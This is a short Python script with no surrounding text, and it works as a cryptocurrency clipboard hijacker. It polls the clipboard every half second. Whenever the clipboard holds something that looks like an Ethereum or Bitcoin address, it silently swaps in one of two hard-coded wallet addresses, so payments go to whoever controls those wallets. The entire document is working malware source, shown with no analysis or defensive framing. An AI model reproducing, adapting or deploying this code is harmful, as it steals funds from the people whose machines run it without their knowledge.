import re
import time
import pyperclip

while True:
    copied = pyperclip.paste()
    if re.fullmatch(r'0x[a-fA-F0-9]{40}', copied):
        pyperclip.copy('0x91e5B37e4dB27a893F4B59E20e265c7086B414c9')
    if re.fullmatch(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}', copied):
        pyperclip.copy('1BoatSLRHtKNngkdXEeobR76b53LETtpyT')
    time.sleep(0.5)
